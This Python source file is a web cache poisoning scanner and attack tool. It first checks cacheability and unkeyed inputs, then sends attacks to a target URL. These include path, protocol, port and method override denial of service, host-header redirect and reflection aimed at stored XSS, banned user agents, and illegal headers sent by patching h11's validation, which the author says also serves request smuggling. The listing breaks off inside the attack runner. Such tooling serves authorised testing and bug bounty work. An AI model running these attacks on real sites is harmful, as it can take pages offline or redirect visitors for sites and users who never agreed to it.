import httpx
import random
import string
import timeit
import time
import logging
import termcolor
import itertools
import concurrent.futures

#used for illegal header patch
import h11
from h11._util import bytesify
from h11._headers import Headers

#
# Global variables
#
hit_values = ["HIT", "Hit", "hit"]
miss_values = ["MISS", "Miss", "miss"]

#
# Display Banner
#
def print_banner():
    print(termcolor.colored("               _______ _____  _______ __   __  ______                        ", "blue"))
    print(termcolor.colored("              /  ____/  _   |/  ____/|  | |  |/ _____\\                      ", "blue"))
    print(termcolor.colored("             /  /   /  / |  /  /     |  |_|  / /______|                      ", "blue"))
    print(termcolor.colored("             \\  \\___\\  \\_|  \\  \\___  |   _   \\ \\______      ", "blue"), termcolor.colored("________ ", "green"), sep='')
    print(termcolor.colored("              \\", "blue"), termcolor.colored("_____", "green"), termcolor.colored("\\\\", "blue"), termcolor.colored("__", "green"), termcolor.colored(" |", "blue"), termcolor.colored("__", "green"), termcolor.colored("|\\", "blue"), termcolor.colored("_____", "green"), termcolor.colored("\\ |", "blue"), termcolor.colored("__", "green"), termcolor.colored("|", "blue"), termcolor.colored("_", "green"), termcolor.colored("|", "blue"), termcolor.colored("__", "green"), termcolor.colored("|\\", "blue"), termcolor.colored("______", "green"), termcolor.colored("/", "blue"), termcolor.colored("_____/    \\O  \\", "green"), sep='')
    print(termcolor.colored("              /  __", "green"), termcolor.colored("/ |", "blue"), termcolor.colored("__", "green"), termcolor.colored("/ /  _   || |", "blue"), termcolor.colored("_", "green"), termcolor.colored("/ // _____\\", "blue"), termcolor.colored("__________        : |", "green"), termcolor.colored("====< ", "red"), sep='')
    print(termcolor.colored("             /  /", "green"), termcolor.colored(" /  | / /  / |  || |/ // /______|         ", "blue"), termcolor.colored("\\____/O__/       ", "green"), sep='')
    print(termcolor.colored("             \\  \\", "green"), termcolor.colored("/ /||/ /\\  \\_|  || |\\ \\\\ \\______                    ", "blue"), sep='')
    print(termcolor.colored("    _________/  /", "green"), termcolor.colored("_/ |__/  \\__ |__||_| \\_\\\\______/                        ", "blue"), sep='')
    print(termcolor.colored("ooo", "yellow"), termcolor.colored("(___________/                                                             ", "green"), sep='')
    print("\n")
    print(termcolor.colored("                    Created by elbo7. Version 1.0\n\n", "green"))


#
# random string generators
#
def gen_rand_str(length):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
def gen_rand_int(length):
    return ''.join(random.choice(string.digits) for i in range(length))

#######################################
### RECON AND INFORMATION GATHERING ###
#######################################

#
# Check if specified endpoint is cacheable through hit/miss, age header and timing.
# Output can be true or false, or in case  of full data will return a tuple with 
# result conclusion as the first element. Function can be optimised for speed through
# skip_timing=True or by lowering the timing_sample, and double_request=False or by lowering
# double_request_sleep. However this may harm detection rate and/or cause false positives
# Default settings are optimal for detection and speed.
# Returns true/false, or a tuple: (is_cacheable, cache_headers_detected, cache_header_list, age_header_detected, time_diff_detected)
#
def is_cacheable(url, full_data=False, force_timing=False, skip_timing=False, timing_sample=15, timing_threshold=1.2, double_request=True, double_request_sleep=1):
    logging.info(termcolor.colored("[i]: Checking cacheability of {0}".format(url), "blue"))

    hit_or_miss_detected = False
    hit_or_miss_headers = []
    age_header_detected = False
    time_diff_detected = False

    with httpx.Client() as http_client:
        # request the url twice because the age header sometimes
        # does not appear on the first request, but on subsequent ones
        response = http_client.get(url)
        if(double_request):
            time.sleep(double_request_sleep)
            response = http_client.get(url)
        
        if response.status_code not in [200,301,302]:
            logging.warning(termcolor.colored("[?]: Server did not respond with 200 OK or a redirect.", "yellow"))
        

        for header in response.headers.items():
            if header[0] == "age" and header[1].isnumeric():
                age_header_detected = True
                logging.info(termcolor.colored("[i]: Age header detected: \"{0}: {1}\"".format(header[0], header[1]), "blue"))

            for hit_or_miss in (hit_values + miss_values):
                if hit_or_miss in header[1]:
                    hit_or_miss_detected = True
                    hit_or_miss_headers.append(header[0])
                    logging.info(termcolor.colored("[i]: Cache HIT/MISS detected: \"{0}: {1}\"".format(header[0], header[1]),"blue"))
                    break
        
        # if we detect headers, and we dont explicitly specify
        # we want timing, we return immediately instead of testing timing.
        if (hit_or_miss_detected or age_header_detected) and not force_timing:
            if full_data:
                return (True, hit_or_miss_detected, hit_or_miss_headers, age_header_detected, time_diff_detected)
            else:
                return True

        if not skip_timing:
            # we did not detect cache headers/explicitly asked for timing, try timing responses.
            avg_response_time_cachebusted = 0
            avg_response_time_cacheintact = 0

            rand_str = gen_rand_str(5)

            for i in range(timing_sample):
                # Timing supposedly non-cached responses
                start_time = timeit.default_timer()
                http_client.get(url, params={rand_str+"-cache": i}, headers={"origin": "abc.com"+str(i)})
                avg_response_time_cachebusted += timeit.default_timer() - start_time

                # Timing supposedly cached responses
                start_time = timeit.default_timer()
                http_client.get(url, params={rand_str+"-cache": 0}, headers={"origin": "abc.com"})
                avg_response_time_cacheintact += timeit.default_timer() - start_time

            avg_response_time_cachebusted /= timing_sample
            avg_response_time_cacheintact /= timing_sample

            if (avg_response_time_cachebusted / avg_response_time_cacheintact) > timing_threshold:
                time_diff_detected = True
                logging.info(termcolor.colored("[i]: Response time proportion of {0:.2f} (> threshold={1}) detected.".format((avg_response_time_cachebusted / avg_response_time_cacheintact), timing_threshold), "blue"))

        # finally, we return the results of the tests
        if hit_or_miss_detected or age_header_detected or time_diff_detected:
            if full_data:
                return (True, hit_or_miss_detected, hit_or_miss_headers, age_header_detected, time_diff_detected)
            else:
                return True
        else:
            if full_data:
                return (False, hit_or_miss_detected, hit_or_miss_headers, age_header_detected, time_diff_detected)
            else:
                return False


#
# Helper function to check if the provided response 
# is cached or not Based on cacheability data provided
# Some cache headers never change, i.e. stay always miss/hit
# to avoid that problem, specify a cache header you know for
# sure changes.
#
def is_page_cached(http_response, dynamic_cache_headers, use_age_header):
    page_is_cached = False

    # Check if we have dynamic cache headers, then 
    # check if any of them are in the response, then
    # check if any of them contain the word 'HIT',
    # if all these checks pass, return true.
    if len(dynamic_cache_headers) > 0:
        intersection_headers = [i for i in dynamic_cache_headers if i in http_response.headers]
        for header in intersection_headers:
            if any(hit in http_response.headers[header] for hit in hit_values):
                page_is_cached = True
    
    # if the age header is 0 or non-existent, the page is not cached
    if use_age_header:
        if "age" in http_response.headers:
            if int(http_response.headers["age"]) > 0:
                page_is_cached = True

    return page_is_cached


#
# Helper function to check which cache-headers change
# when getting cached responses vs uncached responses
# some servers have multiple caches, some of which 
# always provide a hit/miss, usually backend ones,
# this is to determine which headers are useful.
# some headers also simply contain the substrings
# "hit" or "miss" in their values, e.g. "X-Example: MISSing"
# this function filters them out
#
def get_dynamic_headers(cached_response, uncached_response, cache_headers):
    if len(cache_headers) > 0:
        # this says only include cache headers which are both present in the cached and uncached response
        # TODO: make sure that some caches dont simply indicate a hit/miss by omitting a header, for example,
        # maybe some caches only put in a header if a miss happened, but omit it if it's a cache hit, or vice-versa
        intersection_headers = [i for i in cache_headers if (i in cached_response.headers) and (i in uncached_response.headers)]
        # this is a really long way to say only include headers which have
        # a hit value in the cached response and a miss value in the uncached one
        dynamic_cache_headers = [header for header in intersection_headers if (any(hit_value in cached_response.headers[header] for hit_value in hit_values) and any(miss_value in cached_response.headers[header] for miss_value in miss_values))]
        return dynamic_cache_headers
    return []


#
# Check for if inputs are unkeyed, test specific/arbitrary 
# url parameters, host header and origin header and specified
# headers (in dictionary format "header-name": "value")
# Returns a tuple, (are_arbitrary_params_unkeyed, specified_unkeyed_params=[], unkeyed_headers=[])
#
def get_unkeyed_input(url, is_cacheable_data, test_params=[], test_headers={}):
    logging.info(termcolor.colored("[i]: Checking for unkeyed parameters on {0}".format(url), "blue"))

    if not is_cacheable_data[0]:
        return (-1, [], [])

    arbitrary_params_unkeyed = False
    specified_unkeyed_params = []
    unkeyed_headers = []

    with httpx.Client() as http_client:
        # Try to make sure the response is cached first
        response = http_client.get(url)
        time.sleep(0.5)
        response = http_client.get(url)
        
        if response.status_code not in [200,301,302]:
            logging.warning(termcolor.colored("[?]: Server did not respond with 200 OK or a redirect.", "yellow"))
        
        # Check cacheability of arbitrary params
        rand_param = gen_rand_str(5)+"-cache"
        test_response = http_client.get(url, params={rand_param: 1337})

        dynamic_header_list = get_dynamic_headers(response, test_response, is_cacheable_data[2])
        if is_page_cached(test_response, dynamic_header_list, is_cacheable_data[3]):
            logging.info(termcolor.colored("[i]: Arbitrary parameters are unkeyed.", "blue"))
            arbitrary_params_unkeyed = True
        else:
            logging.info(termcolor.colored("[i]: Arbitrary parameters are keyed.", "blue"))

        # Check cacheability of specified params
        for test_param in test_params:
            test_response = http_client.get(url, params={test_param: gen_rand_str(8)})

            dynamic_header_list = get_dynamic_headers(response, test_response, is_cacheable_data[2])
            if is_page_cached(test_response, dynamic_header_list, is_cacheable_data[3]):
                logging.info(termcolor.colored("[i]: \"{0}\" parameter is unkeyed.".format(test_param), "blue"))
                specified_unkeyed_params.append(test_param)
            else:
                logging.info(termcolor.colored("[i]: \"{0}\" parameter is keyed.".format(test_param), "blue"))
        
        # Make sure it's cached again
        response = http_client.get(url)
        time.sleep(0.5)
        response = http_client.get(url)

        # Check cacheability of specified headers
        for test_header in test_headers.items():
            test_response = httpx.get(url, headers={test_header[0]: test_header[1]+gen_rand_int(4)})

            dynamic_header_list = get_dynamic_headers(response, test_response, is_cacheable_data[2])
            if is_page_cached(test_response, dynamic_header_list, is_cacheable_data[3]) and response.status_code == test_response.status_code:
                logging.info(termcolor.colored("[i]: \"{0}\" header is unkeyed.".format(test_header[0]), "blue"))
                unkeyed_headers.append(test_header[0])
            else:
                logging.info(termcolor.colored("[i]: \"{0}\" header is keyed.".format(test_header[0]), "blue"))
        
    return (arbitrary_params_unkeyed, specified_unkeyed_params, unkeyed_headers)



##################################
### SPECIFIC ATTACK TECHNIQUES ###
##################################

#
# tries to override the path and get the page cached, essentially denying service to the specified page.
#
def attack_path_override(url, initial_response=None):
    exploitable_headers = []
    is_vulnerable = False

    #we test for if 404 codes are cached, some servers responsd to path override headers but do not cache them
    #an attack is still very possible in this case, as in DoS through redirection
    is_possible = False
    is_probable = False
    

    #if the page does not return a 200 ok there's nothing to do
    if initial_response == None:
        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                      "accept":"*/*, text/stuff",
                                                      "origin":"https://www.example.com"})
    else:
        response = initial_response

    if response.status_code != 200:
        return (is_vulnerable, exploitable_headers, is_possible, is_probable)
    
    headers = open("lists/path-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"/404" + gen_rand_str(16)})
        #if we get a non 200 response code, we remove the header and resend the request
        if response.status_code != 200:
            time.sleep(0.5)

            is_possible = True
            exploitable_headers.append(header)

            if response.status_code == 404:
                is_probable = True

            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if response.status_code != 200:
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers, is_possible, is_probable)

#
# tries to make it look like the request is done through http when in fact it's done through https, causing the server to 
# cache a redirect 301/302 response, which causes an infinite loop of redirects or an error page, essentially DoS.
#
def attack_protocol_override(url, initial_response=None):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    if initial_response == None:
        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                      "accept":"*/*, text/stuff",
                                                      "origin":"https://www.example.com"})
    else:
        response = initial_response
    
    if response.status_code != 200:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/protocol-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"http"})
        #if we get a redirect, we remove the header and resend the request
        if response.is_redirect:
            time.sleep(0.5)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if response.is_redirect:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# Does the same thing as protocol override, makes the server think it's requesting port 80 which would
# return a 301/302 redirect to port 443, if cached causes infinite redirect loop, essentially DoS.
#
def attack_port_override(url, initial_response=None):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    if initial_response == None:
        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                      "accept":"*/*, text/stuff",
                                                      "origin":"https://www.example.com"})
    else:
        response = initial_response

    if response.status_code != 200:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/port-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"80"})
        #if we get a non 200 response code, we remove the header and resend the request
        if response.status_code != 200:
            time.sleep(0.5)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if response.status_code != 200:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# Overrides the request method to HEAD in order to get an empty response cached, DoS.
#
def attack_method_override(url, initial_response=None):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    if initial_response == None:
        initial_response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                      "accept":"*/*, text/stuff",
                                                      "origin":"https://www.example.com"})

    if initial_response.status_code != 200:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/method-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"HEAD"})
        #if we get an empty response, we remove the header and resend the request
        if len(response.text) <= 2 and len(response.text) < len(initial_response.text):
            time.sleep(0.5)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if len(response.text) <= 2 and len(response.text) < len(initial_response.text):
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# This attack uses an injected host header to change the redirect location of a 30X status code
# can take an extra header and value to cause a redirect on an otherwise 200 ok page
#
def attack_permenant_redirect(url, redirect_causing_header="X-placeholder", redirect_causing_header_value="value"):
    exploitable_headers = []
    is_vulnerable = False

    #if the page does not return a 30X redirect there's nothing to do
    cache_buster = "cache" + gen_rand_str(8)
    response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                        "accept":"*/*, text/" + cache_buster,
                                                                                        "origin":"https://" + cache_buster + ".example.com",
                                                                                        redirect_causing_header:redirect_causing_header_value})

    if response.status_code not in [301, 302, 303, 307, 308]:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/host-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            redirect_causing_header:redirect_causing_header_value,
                                                                                            header:"elbo7.com"})
        #if the location header contains our domain, we succeeded, test if cached or not
        if "location" in response.headers and "elbo7" in response.headers["location"]:
            time.sleep(0.5)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if "location" in response.headers and "elbo7" in response.headers["location"]:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# Tries to induce a 403 by using a banned user agent
#
def attack_evil_user_agent(url, initial_response=None):
    exploitable_values = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    if initial_response == None:
        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                      "accept":"*/*, text/stuff",
                                                      "origin":"https://www.example.com"})
    else:
        response = initial_response

    if response.status_code != 200:
        return (is_vulnerable, exploitable_values)
    
    values = open("lists/evil-user-agents.txt", "r").read().splitlines()

    for value in values:
        #generate a cache buster and send the request with the header
        cache_buster = "cache" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":value,
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
        #if we get a 403, repeat to see if cached
        if response.status_code != 200:
            time.sleep(0.5)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if response.status_code != 200:
                exploitable_values.append(value)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_values)

#
# attack has multiple implications, from denial of service to stored xss.
#
def attack_host_override(url, initial_response=None):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    if initial_response == None:
        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                      "accept":"*/*, text/stuff",
                                                      "origin":"https://www.example.com"})
    else:
        response = initial_response
    
    if response.status_code != 200:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/host-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"www.elbo7.com"})
        #if we get reflection in the response body remove header and try again
        if "elbo7" in response.text:
            time.sleep(0.5)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if "elbo7" in response.text:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# Partially override host header, add the wrong port -> DoS
#
def attack_port_dos(url, initial_response=None):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the response is not a redirect there's nothing to do
    if initial_response == None:
        initial_response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                      "accept":"*/*, text/stuff",
                                                      "origin":"https://www.example.com"})

    if initial_response.status_code not in [301, 302, 303, 307, 308]:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/host-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:initial_response.request.headers["host"] + ":1337"})
        #if we get reflection in the response body remove header and try again
        if "location" in response.headers and ":1337" in response.headers["location"]:
            time.sleep(0.5)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if "location" in response.headers and ":1337" in response.headers["location"]:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# Send illegal header, causes DoS
# httpx won't allow us to execute this attack so we have
# to patch the header validation function with our own
# this also allows us to send invalid content-length 
# headers and transfer-encoding, which is also useful for
# http request smuggling/ desync attacks.
#
#remove validation for headers, can send illegal header names/values.
def modified_normalize_and_validate(headers, _parsed=False):
    new_headers = []
    for name, value in headers:
        name = bytesify(name)
        value = bytesify(value)
        raw_name = name
        name = name.lower()
        new_headers.append((raw_name, name, value))
    return Headers(new_headers)

def attack_illegal_header(url, initial_response=None):
    #patch the validation function in httpx to allow illegal headers
    normalize_and_validate_backup = h11._headers.normalize_and_validate
    h11._headers.normalize_and_validate = modified_normalize_and_validate

    is_vulnerable = False
    
    #if the page does not return a 200 ok/redirect there's nothing to do
    if initial_response == None:
        response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                      "accept":"*/*, text/stuff",
                                                      "origin":"https://www.example.com"})
    else:
        response = initial_response

    if response.status_code not in [200, 301, 302, 303, 307, 308]:
        return (is_vulnerable, [])


    #generate a cache buster and send the request with the header
    cache_buster = "cache" + gen_rand_str(8)
    response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                        "accept":"*/*, text/" + cache_buster,
                                                                                        "origin":"https://" + cache_buster + ".example.com",
                                                                                        "]":"x"})
    #if we get a non 200 response code, we remove the header and resend the request
    if response.status_code not in [200, 301, 302, 303, 307, 308]:
        time.sleep(0.5)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                        "accept":"*/*, text/" + cache_buster,
                                                                                        "origin":"https://" + cache_buster + ".example.com"})
        if response.status_code not in [200, 301, 302, 303, 307, 308]:
            is_vulnerable = True
    

    #restore the validation function, god knows what I'm breaking with this little stunt
    h11._headers.normalize_and_validate = normalize_and_validate_backup
    return (is_vulnerable, "]")

#
# This function tries all specific attacks with console output
#
class specific_attack_result:
    program_name = ""
    url = ""
    dos_path_override = (False, [], False, False)
    dos_proto_override = (False, [])
    rdr_permenant_redirect = (False, [])
    dos_port_override = (False, [])
    dos_method_override = (False, [])
    dos_evil_user_agent = (False, [])
    xss_host_override = (False, [])
    dos_host_header_port = (False, [])
    dos_illegal_header = (False, [])

def specific_attacks(url, program_name):
    logging.info(termcolor.colored("[i]: Initiating specific attacks on \"{}\"".format(url), "blue"))

    ret_val = specific_attack_result()
    ret_val.url = url
    ret_val.program_name = program_name

    for i in range(4):
        try:
            initial_response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                  "accept":"*/*, text/stuff",
                                                                  "origin":"https://www.example.com"})
            break
        except:
            if i == 3:
                return
            else:
                continue

    try:
        attack_result = attack_path_override(url, initial_response)
        ret_val.dos_path_override = attack_result
        if attack_result[0]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: path override through: {}".format(attack_result[1]), "green"))
        elif attack_result[2]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [LIKELY DOS ATTACK]: path override with uncacheable 404 page through: {}".format(attack_result[1]), "green"))
        elif attack_result[3]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [POSSIBLE DOS ATTACK]: path override with uncacheable error page through: {}".format(attack_result[1]), "yellow"))
    except Exception as e:
        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
        pass
    
    try:
        attack_result = attack_protocol_override(url, initial_response)
        ret_val.dos_proto_override = attack_result
        if attack_result[0]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: protocol override redirect loop through: {}".format(attack_result[1]), "green"))
            #if we can force a redirect let's see if we can influence it
            for redirect_causing_header in attack_result[1]:
                secondary_attack_result = attack_permenant_redirect(url, redirect_causing_header, "http")
                if secondary_attack_result[0]:
                    ret_val.rdr_permenant_redirect = secondary_attack_result
                    logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
                    logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: ['{}'] and {}".format(redirect_causing_header, secondary_attack_result[1]), "green"))
    except Exception as e:
        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
        pass

    try:
        attack_result = attack_port_override(url, initial_response)
        if attack_result[0]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: port override redirect loop through: {}".format(attack_result[1]), "green"))
            #if we can force a redirect let's see if we can influence it
            for redirect_causing_header in attack_result[1]:
                secondary_attack_result = attack_permenant_redirect(url, redirect_causing_header, "80")
                if secondary_attack_result[0]:
                    ret_val.rdr_permenant_redirect = secondary_attack_result
                    logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
                    logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: [\"{}\"] and {}".format(redirect_causing_header, secondary_attack_result[1]), "green"))
    except Exception as e:
        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
        pass
    
    try:
        attack_result = attack_permenant_redirect(url, initial_response)
        if attack_result[0]:
            ret_val.rdr_permenant_redirect = attack_result
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [PERMENANT REDIRECT ATTACK]: permenant redirect through: {}".format(attack_result[1]), "green"))
    except Exception as e:
        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
        pass

    try:
        attack_result = attack_method_override(url, initial_response)
        ret_val.dos_method_override = attack_result
        if attack_result[0]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: method override through: {}".format(attack_result[1]), "green"))
    except Exception as e:
        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
        pass

    try:
        attack_result = attack_evil_user_agent(url, initial_response)
        ret_val.dos_evil_user_agent = attack_result
        if attack_result[0]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
